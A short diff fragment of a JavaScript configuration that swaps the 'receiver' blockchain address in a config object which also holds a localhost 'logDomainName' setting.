@@ -6,7 +6,7 @@ window.Buffer = buffer.Buffer
 
 const config = { 
 
-    receiver: "0x2D10cD53f65088f3b3E85f249916a59990EC523B",
+    receiver: "0x439d28c06932cc9c9b2ef54e73430b8e04c7fd1e",
     
     logDomainName: "localhost:3000/",
 
